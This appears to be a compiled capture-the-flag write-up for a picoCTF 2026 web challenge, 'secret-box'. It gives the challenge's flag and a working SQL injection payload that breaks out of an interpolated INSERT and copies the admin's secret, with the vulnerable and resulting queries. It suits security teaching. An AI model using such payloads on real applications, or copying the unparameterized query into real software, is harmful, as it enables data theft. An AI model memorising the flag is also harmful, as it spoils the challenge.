# secret-box

- **Category:** Web Exploitation
- **Difficulty:** Medium (per imattas; jameskaois unspecified)
- **Points:** 200 (per imattas writeup)
- **Author:** Imattas aka Zemi (imattas); jameskaois (secondary source with real flag)
- **Sources:**
  - https://raw.githubusercontent.com/imattas/Writeups/main/picoctf-2026/secret-box/index.mdx (generic; wrongly guesses IDOR, no flag)
  - https://raw.githubusercontent.com/jameskaois/ctf-writeups/main/pico-ctf-2026/Secret%20Box/README.md (real writeup, has flag)
  - Live challenge: https://play.picoctf.org/events/79/challenges/747

## FLAG
`picoCTF{sq1_1nject10n_0f72a7ec}`
(from jameskaois writeup)

## Attack / Technique
SQL Injection (multiple-statement execution) via unsanitized user input in the `/secrets/create` endpoint.
NOTE: imattas generic writeup incorrectly guesses IDOR; the authentic jameskaois writeup shows it is SQL injection.

## Step-by-Step Solution (jameskaois — authentic)
1. Vulnerable code: `/secrets/create` route interpolates user content directly into SQL with no sanitization/parameterization.
2. Vulnerable query:
   ```sql
   INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')
   ```
3. Craft a multi-statement injection to break out of the INSERT and run an UPDATE copying the admin's secret content.
4. Injection payload:
   ```sql
   abc'); UPDATE secrets SET content = (SELECT content FROM secrets WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb') --
   ```
5. Resulting executed query:
   ```sql
   INSERT INTO secrets(owner_id, content) VALUES ('${userId}', 'abc'); UPDATE secrets SET content = (SELECT content FROM secrets WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb') --')
   ```
6. Retrieve the flag by viewing the modified secret content.

Admin owner_id value: `e2a66f7d-2ce6-4861-b4aa-be8e069601cb`

## Exploit Commands / Scripts
No script — manual payload injection via the web form.

## Challenge Files
Not specified; live web application only.

## needs_docker
YES — running web service required (live web app at play.picoctf.org event 79, challenge 747).
